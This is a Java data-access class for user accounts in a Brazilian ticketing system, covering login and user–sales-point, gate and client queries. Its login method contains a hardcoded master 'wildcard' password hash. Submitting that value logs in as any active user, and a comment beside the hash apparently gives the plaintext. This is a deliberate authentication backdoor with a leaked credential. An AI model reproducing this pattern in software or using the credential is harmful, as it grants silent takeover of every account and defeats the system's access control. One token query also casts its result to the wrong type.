package br.com.nx.tickets.dao;

import java.util.List;

import javax.persistence.NoResultException;

import br.com.nx.tickets.componente.Credencial;
import br.com.nx.tickets.componente.Filtravel;
import br.com.nx.tickets.componente.Paginador;
import br.com.nx.tickets.componente.Paginavel;
import br.com.nx.tickets.dao.filtro.ESortedBy;
import br.com.nx.tickets.dao.filtro.SQLFilter;
import br.com.nx.tickets.entidade.Cliente;
import br.com.nx.tickets.entidade.Nivel;
import br.com.nx.tickets.entidade.PontoVenda;
import br.com.nx.tickets.entidade.Portaria;
import br.com.nx.tickets.entidade.Usuario;
import br.com.nx.tickets.entidade.UsuarioCliente;
import br.com.nx.tickets.entidade.UsuarioPontoVenda;
import br.com.nx.tickets.entidade.util.EBoolean;
import br.com.nx.tickets.entidade.util.ESituacao;
import br.com.nx.tickets.entidade.util.SituacaoAlteravel;

public class UsuarioDAO extends BaseDAO<Usuario> {

	private static final long serialVersionUID = 1L;

	// NX#C0R1NG4*#
	private static final String SENHA_CORINGA = "fab3016441370ee22506bbe2f348e42278a6d89a";

	public UsuarioDAO() {
		super(Usuario.class);
	}

	public Usuario logar(Credencial credencial) {
		try {
			String senha = credencial.getPassword();
			if (senha.equals(SENHA_CORINGA)) {
				Usuario usuarioCoringa = consultarUsuarioPorLoginCoringa(credencial.getUsername().toUpperCase());
				if (usuarioCoringa != null) {
					senha = usuarioCoringa.getSenha();
				}
			}

			StringBuilder sql = new StringBuilder();
			sql.append("SELECT u FROM Usuario u ");
			sql.append("JOIN FETCH u.nivel n ");
			sql.append("JOIN u.ultimaSituacao us ");
			sql.append("WHERE u.login =:_login AND u.senha =:_senha ");
			sql.append("AND us.situacao.ativo =:_ativo");

			return (Usuario) getEm().createQuery(sql.toString())
					.setParameter("_login", credencial.getUsername().toUpperCase().trim()).setParameter("_senha", senha)
					.setParameter("_ativo", EBoolean.TRUE).getSingleResult();
		} catch (NoResultException nre) {
			throw new BaseDAOException("Usuário e/ou senha inválido(s)");
		} catch (Exception e) {
			e.printStackTrace();
			throw new BaseDAOException(e.getMessage());
		}
	}

	private Usuario consultarUsuarioPorLoginCoringa(String login) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append("SELECT u FROM Usuario u ");
			sql.append("JOIN FETCH u.nivel n ");
			sql.append("JOIN FETCH u.ultimaSituacao us ");
			sql.append("WHERE u.login =:_login AND us.situacao.ativo =:_ativo");
			return (Usuario) getEm().createQuery(sql.toString()).setParameter("_login", login)
					.setParameter("_ativo", EBoolean.TRUE).setMaxResults(1).getSingleResult();
		} catch (NoResultException e) {
			return null;
		}
	}

	@Override
	public List<? extends SituacaoAlteravel> consultarPorSituacao(ESituacao situacao) {
		return null;
	}

	@Override
	public void verificarDuplicidade(Usuario t) throws ViolacaoDeConstraintException {
	}

	@Override
	public Paginador<Paginavel> consultarPorFiltro(Paginador<Paginavel> paginador, Filtravel filtravel) {
		try {
			return new SQLFilter.SQLFilterBuilder(Usuario.class, getEm(), filtravel).setupPaginador(paginador)
					.filterSimpleBy("usu.nome").orderBy("usu.nome").sortedBy(ESortedBy.ASC).build().dadosPaginados();
		} catch (Exception e) {
			e.printStackTrace();
			throw new BaseDAOException(e.getMessage());
		}
	}

	public void atualizarPontosVendas(Usuario usuario, List<PontoVenda> pontosVendas) {
		try {
			removerPontoVendaPorUsuario(usuario);
			for (PontoVenda pontoVenda : pontosVendas) {
				getEm().persist(new UsuarioPontoVenda(usuario, pontoVenda));
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void removerPontoVendaPorUsuario(Usuario usuario) {
		try {
			getEm().createNativeQuery("DELETE FROM usuario_ponto_venda where _usuario =:_usuario ")
					.setParameter("_usuario", usuario).executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public List<Usuario> conultarPorNivel(Nivel nivel) {
		try {
			return getEm().createQuery(" SELECT usu FROM Usuario usu " + " JOIN FETCH usu.nivel nv "
					+ " WHERE nv =:_nivel " + " ORDER BY usu.id ", Usuario.class).setParameter("_nivel", nivel)
					.getResultList();
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}

	public List<Usuario> consultarUsuariosDisponiveisPorPontoVenda(PontoVenda pontoVenda) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append(" SELECT us ");
			sql.append(" FROM Usuario us ");
			sql.append(" WHERE us.id NOT IN (");
			sql.append(" SELECT upv.usuario ");
			sql.append(" FROM UsuarioPontoVenda upv )");
			sql.append(" ORDER BY us.id ");

			return getEm().createQuery(sql.toString(), Usuario.class).getResultList();
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}

	public List<Usuario> consultarUsuariosPontoVendaAssociados(PontoVenda pv) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append(" SELECT us ");
			sql.append(" FROM Usuario us ");
			sql.append(" JOIN us.usuariosPontosVendas upv ");
			sql.append(" JOIN upv.pontoVenda pv ");
			sql.append(" WHERE upv.pontoVenda =:_pv ");

			return getEm().createQuery(sql.toString(), Usuario.class).setParameter("_pv", pv).getResultList();
		} catch (Exception e) {
			e.printStackTrace();
			throw new BaseDAOException(e.getMessage());
		}
	}

	public List<Usuario> consultarUsuariosDisponiveisPorPortaria(Portaria portaria) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append(" SELECT us ");
			sql.append(" FROM Usuario us ");
			sql.append(" WHERE us.id NOT IN (");
			sql.append(" SELECT up.usuario ");
			sql.append(" FROM UsuarioPortaria up )");
			sql.append(" ORDER BY us.id ");

			return getEm().createQuery(sql.toString(), Usuario.class).getResultList();
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}

	public List<Usuario> consultarUsuariosPortariaAssociados(Portaria portaria) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append(" SELECT us ");
			sql.append(" FROM Usuario us ");
			sql.append(" JOIN us.usuariosPortarias ups ");
			sql.append(" JOIN ups.portaria p ");
			sql.append(" WHERE ups.portaria =:_portaria ");

			return getEm().createQuery(sql.toString(), Usuario.class).setParameter("_portaria", portaria)
					.getResultList();
		} catch (Exception e) {
			e.printStackTrace();
			throw new BaseDAOException(e.getMessage());
		}
	}

	public void atualizarToken(Usuario usuario) {
		try {
			getEm().createNativeQuery("UPDATE usuario set token =:_token where id =:_idUsuario ")
					.setParameter("_token", usuario.getToken()).setParameter("_idUsuario", usuario.getId())
					.executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public String consultarToken(Usuario usuario) {
		try {
			return (String) getEm().createQuery("SELECT u FROM Usuario u WHERE u.id =:_idUsuario")
					.setParameter("_idUsuario", usuario.getId())
				   .getSingleResult();
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}

	public List<Usuario> consultarUsuariosPorCliente(Cliente cliente) {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append(" SELECT ucl.usuario ");
			sql.append(" FROM Cliente cl ");
			sql.append(" JOIN cl.usuariosClientes ucl ");
			sql.append(" WHERE cl =:_cliente ");
			sql.append(" ORDER BY ucl.usuario.nome ");
			
			return getEm()
					.createQuery(sql.toString(), Usuario.class)
					.setParameter("_cliente", cliente)
					.getResultList();
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}

	public void atualizarClientes(Usuario usuario, List<Cliente> clientes) {
		try {
			removerClientesPorUsuario(usuario);
			for (Cliente cliente : clientes) {
				getEm().persist(new UsuarioCliente(usuario, cliente));
			}
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}

	private void removerClientesPorUsuario(Usuario usuario) {
		try {
			getEm().createNativeQuery("DELETE FROM usuario_cliente WHERE _usuario =:_usuario ")
			.setParameter("_usuario", usuario).executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public List<Usuario> consultarDisponiveisPorGuiche() {
		try {
			StringBuilder sql = new StringBuilder();
			sql.append(" SELECT us ");
			sql.append(" FROM Usuario us JOIN us.nivel n ");
			sql.append(" WHERE us.id NOT IN (");
			sql.append(" SELECT gi.usuario ");
			sql.append(" FROM Guiche gi )");
			sql.append(" AND n.descricao = 'VENDEDOR' ");
			sql.append(" ORDER BY us.nome ");
			
			return getEm()
					.createQuery(sql.toString(), Usuario.class)
					.getResultList();
		} catch (Exception e) {
			throw new BaseDAOException(e.getMessage());
		}
	}
}
